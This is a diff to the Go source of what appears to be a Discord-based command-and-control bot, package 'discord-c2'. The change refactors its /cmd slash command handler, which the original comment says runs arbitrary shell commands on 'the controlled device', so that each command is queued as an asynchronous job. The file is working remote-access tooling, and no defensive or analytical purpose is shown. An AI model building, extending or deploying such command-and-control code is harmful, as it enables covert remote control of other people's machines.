@@ -1,16 +1,11 @@
 package commands
 
-// This file contains the /cmd slash command handler, which runs arbitrary
-// shell commands on the controlled device.
+// This file contains the /cmd slash command handler, which starts an
+// asynchronous shell command job.
 
-import (
-	"discord-c2/internal/shell"
+import "github.com/bwmarrin/discordgo"
 
-	"github.com/bwmarrin/discordgo"
-)
-
-// handleSlashCmd extracts the command string from the interaction and runs it
-// via shell.Run, replying with ephemeral status.
+// handleSlashCmd extracts the command string and queues it as a job.
 func handleSlashCmd(s *discordgo.Session, i *discordgo.InteractionCreate, data discordgo.ApplicationCommandInteractionData) {
 	var cmdStr string
 	for _, opt := range data.Options {
@@ -20,21 +15,8 @@ func handleSlashCmd(s *discordgo.Session, i *discordgo.InteractionCreate, data d
 		}
 	}
 	if cmdStr == "" {
-		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
-			Type: discordgo.InteractionResponseChannelMessageWithSource,
-			Data: &discordgo.InteractionResponseData{
-				Content: "No command provided.",
-				Flags:   discordgo.MessageFlagsEphemeral,
-			},
-		})
+		respondEphemeral(s, i, "No command provided.")
 		return
 	}
-	s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
-		Type: discordgo.InteractionResponseChannelMessageWithSource,
-		Data: &discordgo.InteractionResponseData{
-			Content: "Running: `" + cmdStr + "`",
-			Flags:   discordgo.MessageFlagsEphemeral,
-		},
-	})
-	shell.Run(s, i.ChannelID, nil, cmdStr)
+	startJob(s, i, interactionUserID(i), i.ChannelID, cmdStr)
 }
